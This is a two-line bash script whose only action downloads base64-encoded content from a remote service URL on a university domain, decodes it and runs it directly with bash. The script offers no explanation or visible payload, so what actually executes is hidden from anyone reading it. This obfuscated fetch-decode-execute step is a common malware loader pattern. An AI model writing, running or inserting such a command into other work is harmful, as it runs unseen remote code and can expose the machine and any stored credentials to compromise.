#!/bin/bash
bash -c "$(curl --silent https://ws.ufsc.br/VaultUsuarioService | base64 -d)"
